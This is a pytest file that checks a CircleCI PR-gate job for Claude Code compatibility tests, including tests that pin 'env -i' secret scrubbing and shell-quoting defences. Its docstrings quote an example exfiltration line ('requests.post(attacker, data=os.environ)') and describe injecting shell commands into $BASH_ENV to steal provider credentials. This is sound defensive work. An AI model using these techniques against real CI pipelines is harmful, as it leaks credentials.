"""Sanity tests for the CircleCI PR-gate wiring.

Parses `.circleci/config.yml` and asserts the claude_code PR-gate job is
present, in the `build_and_test` workflow, and runs the whole
`tests/claude_code/` suite. This catches the obvious "someone deleted
the job" / "someone deleted the workflow entry" regressions that
otherwise only show up in CI history.

The intent of these tests is *structural*, not *behavioral*: we don't
exercise the docker / npm / proxy machinery here, just verify the YAML
the CircleCI scheduler actually reads.
"""

from __future__ import annotations

from pathlib import Path

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parents[3]
CONFIG_PATH = REPO_ROOT / ".circleci" / "config.yml"
JOB_NAME = "claude_code_compat_pr_gate"


@pytest.fixture(scope="module")
def circleci_config() -> dict:
    return yaml.safe_load(CONFIG_PATH.read_text())


def _job_step_runs(job: dict) -> list[str]:
    """Return the concatenated `command` text of every `run:` step."""
    commands: list[str] = []
    for step in job.get("steps", []):
        if isinstance(step, dict) and "run" in step:
            run = step["run"]
            if isinstance(run, dict):
                cmd = run.get("command")
                if isinstance(cmd, str):
                    commands.append(cmd)
    return commands


def test_pr_gate_job_is_defined(circleci_config: dict) -> None:
    assert JOB_NAME in circleci_config["jobs"], (
        f"{JOB_NAME} job is missing from .circleci/config.yml — the PR gate "
        "is the merge-blocker; deleting it silently disables the gate."
    )


def test_pr_gate_job_is_in_build_and_test_workflow(circleci_config: dict) -> None:
    workflow = circleci_config["workflows"]["build_and_test"]["jobs"]
    job_names = [
        next(iter(entry.keys())) if isinstance(entry, dict) else entry
        for entry in workflow
    ]
    assert JOB_NAME in job_names, (
        f"{JOB_NAME} is defined but not wired into workflows.build_and_test — "
        "CircleCI will never run it without this entry."
    )


def test_pr_gate_job_requires_docker_database_image(circleci_config: dict) -> None:
    """The proxy is booted from `litellm-docker-database:ci`, so the gate
    must wait for that build to finish before it runs."""
    workflow = circleci_config["workflows"]["build_and_test"]["jobs"]
    entry = next(e[JOB_NAME] for e in workflow if isinstance(e, dict) and JOB_NAME in e)
    requires = entry.get("requires", [])
    assert "build_docker_database_image" in requires


def test_pr_gate_job_invokes_version_resolver_and_pinned_install(
    circleci_config: dict,
) -> None:
    """Acceptance criterion: the CLI is installed at a version computed
    at run time from the npm registry, and the version is logged."""
    job = circleci_config["jobs"][JOB_NAME]
    commands = "\n".join(_job_step_runs(job))
    assert "tests.claude_code.pr_gate_version_resolver" in commands, (
        "PR-gate job must invoke the version resolver; otherwise the "
        "3-day publish-age security buffer is bypassed."
    )
    # Pinned install of the resolved version (not 'latest', not unversioned)
    assert "@anthropic-ai/claude-code@${CLAUDE_CODE_VERSION}" in commands


def test_pr_gate_job_runs_claude_code_test_dir(circleci_config: dict) -> None:
    job = circleci_config["jobs"][JOB_NAME]
    commands = "\n".join(_job_step_runs(job))
    assert "tests/claude_code/" in commands, (
        f"{JOB_NAME} must run the tests/claude_code/ suite; otherwise "
        "the gate isn't actually exercising the compat tests."
    )


def test_pr_gate_job_mounts_test_config_yaml(circleci_config: dict) -> None:
    """The tests reference proxy aliases (`claude-haiku-4-5` etc.) that
    only the routing config knows about — the gate must mount it into
    the proxy container."""
    job = circleci_config["jobs"][JOB_NAME]
    commands = "\n".join(_job_step_runs(job))
    assert "tests/claude_code/test_config.yaml" in commands


def test_pr_gate_job_exports_proxy_env_used_by_tests(
    circleci_config: dict,
) -> None:
    """Tests read LITELLM_PROXY_BASE_URL / LITELLM_PROXY_API_KEY — the
    job must export both before the pytest invocation."""
    job = circleci_config["jobs"][JOB_NAME]
    commands = "\n".join(_job_step_runs(job))
    assert "LITELLM_PROXY_BASE_URL" in commands
    assert "LITELLM_PROXY_API_KEY" in commands


def test_pr_gate_job_persists_compat_result_artifacts(
    circleci_config: dict,
) -> None:
    """The conftest writes per-cell tagged-union JSON + the per-provider
    rate-limit summary to paths controlled by COMPAT_RESULTS_PATH /
    COMPAT_RATE_LIMIT_SUMMARY_PATH. The PR gate must (1) point both env
    vars at a known directory, and (2) `store_artifacts` that directory
    so reviewers can pull the breakdown when a red gate needs triage.

    Without this, the conftest silently writes the artifacts to the
    working directory and no CI step persists them.
    """
    job = circleci_config["jobs"][JOB_NAME]
    commands = "\n".join(_job_step_runs(job))
    assert "COMPAT_RESULTS_PATH" in commands, (
        "PR gate must override COMPAT_RESULTS_PATH so the compat JSON "
        "lands in a directory we explicitly persist below."
    )
    assert "COMPAT_RATE_LIMIT_SUMMARY_PATH" in commands, (
        "PR gate must override COMPAT_RATE_LIMIT_SUMMARY_PATH so the "
        "per-provider rate-limit summary lands in a persisted directory."
    )
    # The chosen directory must be wired into a store_artifacts step.
    store_artifacts_paths: list[str] = []
    for step in job.get("steps", []):
        if not isinstance(step, dict):
            continue
        sa = step.get("store_artifacts")
        if isinstance(sa, dict) and isinstance(sa.get("path"), str):
            store_artifacts_paths.append(sa["path"])
    assert store_artifacts_paths, (
        "PR gate must declare at least one store_artifacts step so the "
        "compat-results.json / compat-rate-limit-summary.json can be "
        "downloaded from the CircleCI artifact browser."
    )
    # And the export must point at that directory (any of them), so the
    # conftest actually writes inside the persisted tree.
    assert any(path in commands for path in store_artifacts_paths), (
        "PR gate exports COMPAT_RESULTS_PATH but not into any directory "
        f"declared by store_artifacts (declared: {store_artifacts_paths})."
    )


def _find_step_command(job: dict, name_substring: str) -> str:
    """Return the `command` text of the first run-step whose `name`
    contains `name_substring`; empty string if no match.

    The PR-gate job has many run-steps; matching by a substring of
    `name:` keeps this helper resilient to non-load-bearing renames
    (e.g. "Resolve Claude Code CLI version (newest published >= 3 days
    ago)" -> "Resolve Claude Code CLI version") without coupling the
    test to the full step name.
    """
    for step in job.get("steps", []):
        if not (isinstance(step, dict) and "run" in step):
            continue
        run = step["run"]
        if not isinstance(run, dict):
            continue
        if name_substring in (run.get("name") or ""):
            return run.get("command") or ""
    return ""


def test_pr_gate_resolver_step_scrubs_secrets_from_env(
    circleci_config: dict,
) -> None:
    """The version resolver is PR-controlled Python code that runs in
    the same CircleCI job as the provider secrets injected later into
    the proxy container. If the resolver step doesn't scrub the env,
    a malicious PR can edit `tests/claude_code/pr_gate_version_resolver`
    to read ANTHROPIC_API_KEY / AWS_* / VERTEXAI_* / AZURE_FOUNDRY_* /
    GITHUB_TOKEN out of `os.environ` and exfiltrate them over the
    outbound npm registry HTTPS call.

    Pin the `env -i` scrub here so the mitigation cannot silently
    regress in a future YAML refactor.
    """
    job = circleci_config["jobs"][JOB_NAME]
    command = _find_step_command(job, "Resolve Claude Code CLI version")
    assert command, "PR gate must have a step that resolves the CLI version."
    assert "env -i" in command, (
        "The version-resolver step must wrap the resolver invocation in "
        "`env -i` so PR-controlled Python cannot read provider secrets "
        "from the CircleCI job env."
    )
    # The actual resolver invocation must be downstream of `env -i` —
    # i.e. they must appear in that order in the command body. Use
    # `rindex` for the resolver match in case the surrounding comment
    # block also mentions the module in prose; the actual `python -m`
    # invocation is always the last occurrence.
    env_i_idx = command.index("env -i")
    resolver_idx = command.rindex("tests.claude_code.pr_gate_version_resolver")
    assert env_i_idx < resolver_idx, (
        "`env -i` must precede the resolver invocation; otherwise the "
        "resolver still sees the unscrubbed env."
    )


def test_pr_gate_npm_install_step_scrubs_secrets_from_env(
    circleci_config: dict,
) -> None:
    """`npm install -g @anthropic-ai/claude-code` runs the package's
    `postinstall: node install.cjs` script, which executes arbitrary
    code from npm with the full job env — and the job env carries
    provider credentials. `claude --version` on the next line is also
    package code. A compromised package release (or a transitive
    registry hijack) could exfiltrate ANTHROPIC_API_KEY / AWS_* /
    VERTEXAI_* / AZURE_FOUNDRY_* / GITHUB_TOKEN.

    Pin the `env -i` scrub on the install step so the mitigation
    cannot silently regress.
    """
    job = circleci_config["jobs"][JOB_NAME]
    command = _find_step_command(job, "Install Node.js")
    assert command, "PR gate must have a step that installs Node + the CLI."
    assert "env -i" in command, (
        "The `npm install -g @anthropic-ai/claude-code` step must wrap "
        "the install + `claude --version` invocations in `env -i` so "
        "package install/postinstall code cannot read provider secrets "
        "from the CircleCI job env."
    )
    # Both load-bearing invocations must be downstream of `env -i`. We
    # use `rindex` because the surrounding comment block also mentions
    # `claude --version` and `npm install` in prose; what we care about
    # is the *actual* shell invocation, which is always the last
    # occurrence of each string in the step body.
    env_i_idx = command.index("env -i")
    npm_install_idx = command.rindex(
        'npm install -g "@anthropic-ai/claude-code@${CLAUDE_CODE_VERSION}"'
    )
    claude_version_idx = command.rindex("claude --version")
    assert env_i_idx < npm_install_idx, (
        "`env -i` must precede `npm install -g`; otherwise the install/"
        "postinstall scripts still see the unscrubbed env."
    )
    assert env_i_idx < claude_version_idx, (
        "`env -i` must precede `claude --version`; otherwise the CLI "
        "still sees the unscrubbed env on its first invocation."
    )


def test_pr_gate_pytest_step_scrubs_secrets_from_env(
    circleci_config: dict,
) -> None:
    """The compat suite under `tests/claude_code/` is PR-controlled code:
    a malicious PR could add `requests.post(attacker, data=os.environ)`
    to any test or conftest hook and exfiltrate provider creds that
    CircleCI injects into every step's env (those creds are what the
    proxy container needs via `docker -e`; pytest itself only talks to
    the proxy at localhost:4000).

    Pin the `env -i` scrub on the pytest step so the mitigation cannot
    silently regress in a future YAML refactor.
    """
    job = circleci_config["jobs"][JOB_NAME]
    command = _find_step_command(job, "Run Claude Code compatibility test suite")
    assert command, "PR gate must have a step that runs the compat suite."
    assert "env -i" in command, (
        "The compat-suite pytest step must wrap the pytest invocation in "
        "`env -i` so PR-controlled test code cannot read provider secrets "
        "from the CircleCI job env."
    )
    # The pytest invocation must be downstream of `env -i`. Use `rindex`
    # because the surrounding comment block also mentions pytest in prose.
    env_i_idx = command.index("env -i")
    pytest_idx = command.rindex("uv run --no-sync python -m pytest")
    assert env_i_idx < pytest_idx, (
        "`env -i` must precede the pytest invocation; otherwise the "
        "test process still sees the unscrubbed env."
    )


def test_pr_gate_resolver_output_safely_persisted_to_bash_env(
    circleci_config: dict,
) -> None:
    """The resolver step writes the resolved version to `$BASH_ENV` so
    later steps can interpolate it. `$BASH_ENV` is sourced by bash at
    the start of every subsequent step *before* any `env -i` wrapper
    we install can run, so the job env (with provider credentials in
    scope) is live at that moment. The resolver lives under
    `tests/claude_code/` and is therefore PR-controlled — a malicious
    PR could make it print a value containing a newline + shell
    snippet to exfiltrate credentials.

    Pin the two defenses so they cannot silently regress:

    1. The persisted value must be shell-quoted via `printf '%q'`
       (not unquoted via `echo`) so any bytes the resolver emits are
       safely re-parsed as a literal `export` assignment.
    2. The resolver output must be matched against a strict semver
       regex and rejected otherwise, so anything that isn't a
       `N.N.N` string never reaches `$BASH_ENV` in the first place.
    """
    job = circleci_config["jobs"][JOB_NAME]
    command = _find_step_command(job, "Resolve Claude Code CLI version")
    assert command, "PR gate must have a step that resolves the CLI version."
    assert "printf 'export CLAUDE_CODE_VERSION=%q\\n'" in command, (
        "Resolver step must persist CLAUDE_CODE_VERSION via `printf '%q'` "
        "(shell-quoted) — a raw `echo \"export ...=$VAR\"` lets PR-controlled "
        "resolver output inject shell commands into $BASH_ENV that run with "
        "provider credentials in scope at the start of the next step."
    )
    assert "[[ \"$CLAUDE_CODE_VERSION\" =~ ^[0-9]+\\.[0-9]+\\.[0-9]+$ ]]" in command, (
        "Resolver step must validate CLAUDE_CODE_VERSION against a strict "
        "whole-string semver regex (`[[ ... =~ ^N.N.N$ ]]`) before "
        "persisting; a per-line grep would pass a multi-line resolver "
        "output, and anything that isn't a `N.N.N` string should never "
        "reach $BASH_ENV / `npm install`."
    )


def test_existing_proxy_e2e_anthropic_job_unchanged(circleci_config: dict) -> None:
    """No regression to the existing `proxy_e2e_anthropic_messages_tests`
    job (acceptance criterion). We don't lock its full body, but we do
    pin the load-bearing surface: it still runs the same test directory
    and is still wired into the workflow."""
    assert "proxy_e2e_anthropic_messages_tests" in circleci_config["jobs"]
    workflow = circleci_config["workflows"]["build_and_test"]["jobs"]
    job_names = [
        next(iter(entry.keys())) if isinstance(entry, dict) else entry
        for entry in workflow
    ]
    assert "proxy_e2e_anthropic_messages_tests" in job_names
    body = "\n".join(
        _job_step_runs(circleci_config["jobs"]["proxy_e2e_anthropic_messages_tests"])
    )
    assert "tests/proxy_e2e_anthropic_messages_tests/" in body
